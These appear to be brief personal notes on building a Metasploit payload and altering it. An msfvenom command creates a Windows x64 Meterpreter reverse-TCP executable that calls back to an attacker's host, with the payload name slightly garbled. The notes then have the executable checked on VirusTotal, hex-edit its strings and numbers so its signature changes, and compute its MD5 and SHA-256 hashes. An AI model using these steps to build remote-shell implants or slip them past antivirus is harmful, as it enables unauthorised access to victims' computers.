# generate-hashes-of-payload

## msfvenom -p windows/x64meterpreter/reverse_tcp LHOST= LPORT=4444 -o payload.exe


# virus total website to check virus

#check strings of payload
```strings payload.exe```

# change value ins strings
```hexeditor payload.exe```
# Change only word string and change some numbers
```ctrl```+ ```x```and ```enter``` to save


# how to generate hashes [md5 and sha are type of calculation and algorithm to generate hashes]
```cd /tmp```
# for md5
```md5sum payload.exe```
# for sha
```sha256deep payload.exe```
